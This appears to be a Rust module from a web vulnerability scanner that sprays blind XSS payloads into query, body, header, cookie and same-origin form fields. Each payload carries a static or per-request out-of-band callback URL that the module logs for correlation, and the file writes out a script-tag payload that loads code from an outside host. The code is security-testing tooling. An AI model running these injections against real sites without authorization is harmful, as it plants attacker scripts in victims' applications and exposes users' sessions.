use crate::oob::{InjectionRecord, OobSession};
use crate::target_parser::Target;

/// Where a blind callback URL comes from for a given injection pass.
///
/// `Static` is the historical `-b/--blind <url>` behavior. `Oob` mints a fresh
/// per-payload interactsh URL (recorded for later correlation). `Both` sends a
/// payload for each — so `-b` and `--blind-oob` together fire both channels.
#[derive(Clone, Copy)]
pub enum CallbackSource<'a> {
    Static(&'a str),
    Oob(&'a OobSession),
    Both {
        url: &'a str,
        session: &'a OobSession,
    },
}

impl<'a> CallbackSource<'a> {
    fn static_url(&self) -> Option<&'a str> {
        match self {
            CallbackSource::Static(u) => Some(u),
            CallbackSource::Both { url, .. } => Some(url),
            CallbackSource::Oob(_) => None,
        }
    }

    fn session(&self) -> Option<&'a OobSession> {
        match self {
            CallbackSource::Oob(s) => Some(s),
            CallbackSource::Both { session, .. } => Some(session),
            CallbackSource::Static(_) => None,
        }
    }
}

/// Map an internal param-type tag to the wire `location` understood by
/// `generate_poc`. Cookies fold into `Header` (a cookie side-channel POC).
fn location_of(param_type: &str) -> &'static str {
    match param_type {
        "query" => "Query",
        "body" => "Body",
        "header" | "cookie" => "Header",
        _ => "",
    }
}

/// Build the concrete payload(s) to send for one (param × template) slot and,
/// for any OOB source, mint+record a fresh callback URL keyed by its nonce so a
/// later interaction correlates back to this exact request.
///
/// `record_url` is the URL stored in the correlation registry (the target URL,
/// or a form's action URL). `location`/`method` describe the injection point.
fn build_send_payloads(
    source: &CallbackSource<'_>,
    template: &str,
    record_url: &str,
    param: &str,
    location: &str,
    method: &str,
) -> Vec<String> {
    let mut out = Vec::with_capacity(2);
    if let Some(url) = source.static_url() {
        out.push(template.replace("{}", url));
    }
    if let Some(session) = source.session() {
        let (url, nonce) = session.mint_url();
        let payload = template.replace("{}", &url);
        session.registry().record(
            nonce,
            InjectionRecord {
                target_url: record_url.to_string(),
                param: param.to_string(),
                location: location.to_string(),
                payload: payload.clone(),
                method: method.to_string(),
            },
        );
        out.push(payload);
    }
    out
}

/// Build the blind-XSS payload *templates* (callback placeholder still present,
/// normalized to a single `{}` marker).
///
/// When `custom_template_path` is provided, every non-empty, non-`#`-comment
/// line that contains `{callback}` is treated as a template. Lines without
/// `{callback}` are reported via stderr and dropped — the contract advertised by
/// `--custom-blind-xss-payload`. If no usable lines exist (or the file can't be
/// read), fall back to the built-in template.
fn build_blind_templates(custom_template_path: Option<&str>) -> Vec<String> {
    if let Some(path) = custom_template_path {
        match crate::utils::fs::read_bounded(
            std::path::Path::new(path),
            crate::utils::fs::MAX_FILE_READ_BYTES,
            "custom blind XSS template",
        ) {
            Ok(content) => {
                let mut templates: Vec<String> = Vec::new();
                let mut bad_lines = 0u32;
                for (lineno, line) in content.lines().enumerate() {
                    let trimmed = line.trim();
                    if trimmed.is_empty() || trimmed.starts_with('#') {
                        continue;
                    }
                    if trimmed.contains("{callback}") {
                        templates.push(trimmed.replace("{callback}", "{}"));
                    } else {
                        bad_lines += 1;
                        if bad_lines <= 3 {
                            eprintln!(
                                "Warning: --custom-blind-xss-payload line {} skipped (no {{callback}} placeholder)",
                                lineno + 1
                            );
                        }
                    }
                }
                if !templates.is_empty() {
                    return templates;
                }
                eprintln!(
                    "Warning: --custom-blind-xss-payload {} had no usable lines — falling back to built-in",
                    path
                );
            }
            Err(e) => {
                eprintln!(
                    "Warning: failed to read --custom-blind-xss-payload {}: {} — falling back to built-in",
                    path, e
                );
            }
        }
    }
    let template = crate::payload::XSS_BLIND_PAYLOADS
        .first()
        .copied()
        .unwrap_or("\"'><script src={}></script>");
    vec![template.to_string()]
}

/// Backward-compatible entry: inject a blind payload built from a single static
/// callback URL (`-b/--blind`). Thin shim over [`blind_scanning_with`].
pub async fn blind_scanning(
    target: &Target,
    callback_url: &str,
    custom_template_path: Option<&str>,
) {
    blind_scanning_with(
        target,
        CallbackSource::Static(callback_url),
        custom_template_path,
    )
    .await;
}

/// Inject blind payloads into every query/body/header/cookie param. For an OOB
/// (or `Both`) source, each (param × template) gets a fresh per-payload callback
/// URL recorded for later correlation.
pub async fn blind_scanning_with(
    target: &Target,
    source: CallbackSource<'_>,
    custom_template_path: Option<&str>,
) {
    let templates = build_blind_templates(custom_template_path);
    let method = target.parse_method().to_string();
    let record_url = target.url.as_str();

    // Collect all params with static str types to avoid per-param String allocation
    let mut all_params: Vec<(String, &str)> = Vec::new();

    // Query params
    for (k, _v) in target.url.query_pairs() {
        all_params.push((k.into_owned(), "query"));
    }

    // Body params
    if let Some(data) = &target.data {
        for pair in data.split('&') {
            if let Some((k, _v)) = pair.split_once('=') {
                all_params.push((k.to_string(), "body"));
            }
        }
    }

    // Headers
    for (k, _v) in &target.headers {
        all_params.push((k.clone(), "header"));
    }

    // Cookies
    for (k, _v) in &target.cookies {
        all_params.push((k.clone(), "cookie"));
    }

    // Send requests for each (param × template × callback channel). Custom
    // templates typically supply just one or two shapes, so the product stays
    // small.
    for (param_name, param_type) in &all_params {
        let location = location_of(param_type);
        for template in &templates {
            for payload in
                build_send_payloads(&source, template, record_url, param_name, location, &method)
            {
                send_blind_request(target, param_name, &payload, param_type).await;
            }
        }
    }
}

async fn send_blind_request(target: &Target, param_name: &str, payload: &str, param_type: &str) {
    use tokio::time::{Duration, sleep};
    use url::form_urlencoded;

    let client = target.build_client_or_default();

    let url = match param_type {
        "query" => {
            let mut pairs: Vec<(String, String)> = target
                .url
                .query_pairs()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect();
            let mut found = false;
            for pair in &mut pairs {
                if pair.0 == param_name {
                    pair.1 = payload.to_string();
                    found = true;
                    break;
                }
            }
            if !found {
                pairs.push((param_name.to_string(), payload.to_string()));
            }
            let query = form_urlencoded::Serializer::new(String::new())
                .extend_pairs(&pairs)
                .finish();
            let mut url = target.url.clone();
            url.set_query(Some(&query));
            url
        }
        "body" => target.url.clone(),
        "header" => target.url.clone(),
        "cookie" => target.url.clone(),
        _ => target.url.clone(),
    };

    let mut request = client.request(target.parse_method(), url.clone());

    let mut headers = target.headers.clone();
    let mut cookies = target.cookies.clone();
    let mut body = target.data.clone();

    match param_type {
        "query" => {
            // Already handled in url
        }
        "body" => {
            if let Some(data) = &target.data {
                // Parse the form body and replace only the exact-name match's
                // value, then re-serialize (mirrors the query branch above). The
                // old `str::replace("{name}=", "{name}={payload}&")` never
                // removed the original value (`a=1&b=2` -> `a=PAY&1&b=2`,
                // orphaning `&1`) and matched substring-colliding names (`id`
                // also rewrote `userid`), corrupting the body and injecting into
                // the wrong parameter — a silent blind-XSS delivery failure.
                let mut pairs: Vec<(String, String)> = form_urlencoded::parse(data.as_bytes())
                    .map(|(k, v)| (k.to_string(), v.to_string()))
                    .collect();
                let mut found = false;
                for pair in &mut pairs {
                    if pair.0 == param_name {
                        pair.1 = payload.to_string();
                        found = true;
                        break;
                    }
                }
                if !found {
                    pairs.push((param_name.to_string(), payload.to_string()));
                }
                body = Some(
                    form_urlencoded::Serializer::new(String::new())
                        .extend_pairs(&pairs)
                        .finish(),
                );
            }
        }
        "header" => {
            for (k, v) in &mut headers {
                if k == param_name {
                    *v = payload.to_string();
                }
            }
        }
        "cookie" => {
            for (k, v) in &mut cookies {
                if k == param_name {
                    *v = payload.to_string();
                }
            }
        }
        _ => {}
    }

    for (k, v) in &headers {
        request = request.header(k, v);
    }
    if let Some(ua) = &target.user_agent {
        request = request.header("User-Agent", ua);
    }
    let mut cookie_header = String::new();
    for (i, (k, v)) in cookies.iter().enumerate() {
        if i > 0 {
            cookie_header.push_str("; ");
        }
        cookie_header.push_str(k);
        cookie_header.push('=');
        cookie_header.push_str(v);
    }
    if !cookie_header.is_empty() {
        request = request.header("Cookie", cookie_header);
    }
    if let Some(b) = &body {
        request = request.body(b.clone());
    }

    // Send the request. We don't inspect the response (blind payloads report
    // out-of-band), but surface transport errors at DEBUG so users can tell a
    // delivery failure apart from a target that simply never calls back.
    crate::record_outbound_request().await;
    if let Err(e) = request.send().await {
        crate::dbg_log!(
            "blind request failed param={} type={}: {}",
            param_name,
            param_type,
            e
        );
    }

    if target.delay > 0 {
        sleep(Duration::from_millis(target.delay)).await;
    }
}

/// Discover HTML `<form>` elements on the target page and submit the Blind XSS
/// payload to each same-origin POST form, one request per injectable text-like
/// field. Non-text inputs (hidden, file, submit, button, image, reset,
/// checkbox, radio) and `<select>` keep their original value so CSRF tokens
/// and similar state survive the injection.
///
/// GET forms are skipped because their fields overlap with the existing
/// query-param blind injection in [`blind_scanning`]. Cross-origin form
/// actions are skipped to avoid unintended outbound requests. Multipart
/// forms are also skipped in this first pass.
/// Backward-compatible entry: blind-scan forms with a single static callback
/// URL (`-b/--blind`). Thin shim over [`blind_scan_forms_with`].
pub async fn blind_scan_forms(
    target: &Target,
    callback_url: &str,
    custom_template_path: Option<&str>,
) {
    blind_scan_forms_with(
        target,
        CallbackSource::Static(callback_url),
        custom_template_path,
    )
    .await;
}

/// Discover same-origin POST forms and submit a blind payload per injectable
/// field. For an OOB (or `Both`) source each field gets a fresh per-payload
/// callback URL recorded for later correlation.
pub async fn blind_scan_forms_with(
    target: &Target,
    source: CallbackSource<'_>,
    custom_template_path: Option<&str>,
) {
    use tokio::time::{Duration, sleep};
    use url::form_urlencoded;

    let templates = build_blind_templates(custom_template_path);
    // For form-discovery blast we keep the first template — the form
    // probe is best-effort and using every template here multiplies
    // request count without changing detection probability much.
    let template = templates
        .first()
        .map(String::as_str)
        .unwrap_or("\"'><script src={}></script>");

    let client = target.build_client_or_default();
    let cookie_header = build_cookie_header(&target.cookies);

    // Always GET the form-bearing page. Reusing target.method would POST to
    // the form handler instead of fetching the landing page that renders the
    // form, mirroring discovery::probe_html_forms.
    let mut fetch = client.get(target.url.clone());
    for (k, v) in &target.headers {
        fetch = fetch.header(k, v);
    }
    if let Some(ua) = &target.user_agent {
        fetch = fetch.header("User-Agent", ua);
    }
    if let Some(ref h) = cookie_header {
        fetch = fetch.header("Cookie", h);
    }
    crate::record_outbound_request().await;
    let html = match fetch.send().await {
        Ok(resp) => match crate::utils::http::read_body(resp).await {
            Ok(text) => text,
            Err(_) => return,
        },
        Err(_) => return,
    };

    // Parse forms in a tight scope so `scraper::Html` (which is !Send) never
    // escapes across an await boundary.
    struct FormField {
        name: String,
        value: String,
        injectable: bool,
    }
    struct FormInfo {
        action: url::Url,
        fields: Vec<FormField>,
    }
    let forms: Vec<FormInfo> = {
        let document = scraper::Html::parse_document(&html);
        let form_sel = crate::scanning::selectors::form();
        let input_sel = crate::scanning::selectors::input_textarea_select();

        let mut out = Vec::new();
        for form in document.select(form_sel) {
            let method = form.value().attr("method").unwrap_or("get");
            if !method.eq_ignore_ascii_case("post") {
                continue;
            }
            let enctype = form.value().attr("enctype").unwrap_or("");
            if enctype.eq_ignore_ascii_case("multipart/form-data") {
                continue;
            }

            let action_attr = form.value().attr("action").unwrap_or("");
            let action_url = if action_attr.is_empty() || action_attr == "#" {
                target.url.clone()
            } else {
                match target.url.join(action_attr) {
                    Ok(u) => u,
                    Err(_) => continue,
                }
            };

            if !is_same_origin(&target.url, &action_url) {
                continue;
            }

            let mut fields: Vec<FormField> = Vec::new();
            for input in form.select(input_sel) {
                let name = input.value().attr("name").unwrap_or("").to_string();
                if name.is_empty() {
                    continue;
                }
                let value = input.value().attr("value").unwrap_or("").to_string();
                let injectable = is_injectable_input(&input);
                fields.push(FormField {
                    name,
                    value,
                    injectable,
                });
            }
            if !fields.iter().any(|f| f.injectable) {
                continue;
            }

            out.push(FormInfo {
                action: action_url,
                fields,
            });
        }
        out
    };

    for FormInfo { action, fields } in forms {
        let action_str = action.as_str().to_string();
        for field_idx in 0..fields.len() {
            if !fields[field_idx].injectable {
                continue;
            }
            // One payload per callback channel (Static / Oob / Both). For OOB
            // this mints+records a fresh URL keyed to this form field.
            let field_name = &fields[field_idx].name;
            let payloads =
                build_send_payloads(&source, template, &action_str, field_name, "Body", "POST");
            for payload in &payloads {
                let body = fields
                    .iter()
                    .enumerate()
                    .map(|(i, f)| {
                        let value = if i == field_idx { payload } else { &f.value };
                        let enc_n =
                            form_urlencoded::byte_serialize(f.name.as_bytes()).collect::<String>();
                        let enc_v =
                            form_urlencoded::byte_serialize(value.as_bytes()).collect::<String>();
                        format!("{}={}", enc_n, enc_v)
                    })
                    .collect::<Vec<_>>()
                    .join("&");

                let mut request = client.post(action.clone());
                for (k, v) in &target.headers {
                    // Skip Content-Type from caller-supplied headers so we don't
                    // emit a second value that conflicts with the urlencoded body.
                    if k.eq_ignore_ascii_case("content-type") {
                        continue;
                    }
                    request = request.header(k, v);
                }
                // Set Content-Type last to guarantee it wins.
                request = request.header("Content-Type", "application/x-www-form-urlencoded");
                if let Some(ua) = &target.user_agent {
                    request = request.header("User-Agent", ua);
                }
                if let Some(ref h) = cookie_header {
                    request = request.header("Cookie", h);
                }
                request = request.body(body);

                crate::record_outbound_request().await;
                if let Err(e) = request.send().await {
                    crate::dbg_log!(
                        "blind form request failed action={} field_idx={}: {}",
                        action,
                        field_idx,
                        e
                    );
                }

                if target.delay > 0 {
                    sleep(Duration::from_millis(target.delay)).await;
                }
            }
        }
    }
}

/// Build a `Cookie:` header value once, returning None if the target has no
/// cookies configured.
fn build_cookie_header(cookies: &[(String, String)]) -> Option<String> {
    if cookies.is_empty() {
        return None;
    }
    Some(
        cookies
            .iter()
            .map(|(k, v)| format!("{}={}", k, v))
            .collect::<Vec<_>>()
            .join("; "),
    )
}

/// Returns true when an `input`/`textarea`/`select` node accepts free-form
/// user-controlled text, so substituting the Blind XSS payload there makes
/// sense. Non-text-bearing inputs (hidden, file, submit, button, image,
/// reset, checkbox, radio) and `<select>` keep their original value so CSRF
/// tokens and option choices survive.
fn is_injectable_input(el: &scraper::element_ref::ElementRef<'_>) -> bool {
    let tag = el.value().name();
    if tag.eq_ignore_ascii_case("textarea") {
        return true;
    }
    if !tag.eq_ignore_ascii_case("input") {
        // `<select>` and anything else: not free-form text.
        return false;
    }
    // <input> defaults to type="text" when the attribute is missing or
    // unrecognized. Treat the well-known text-bearing types as injectable.
    let ty = el.value().attr("type").unwrap_or("text");
    matches!(
        ty.to_ascii_lowercase().as_str(),
        "text" | "search" | "url" | "email" | "tel" | "password" | "number"
    )
}

/// Same-origin check: scheme + host + port must match.
pub(crate) fn is_same_origin(a: &url::Url, b: &url::Url) -> bool {
    a.scheme() == b.scheme()
        && a.host_str() == b.host_str()
        && a.port_or_known_default() == b.port_or_known_default()
}

#[cfg(test)]
mod tests;
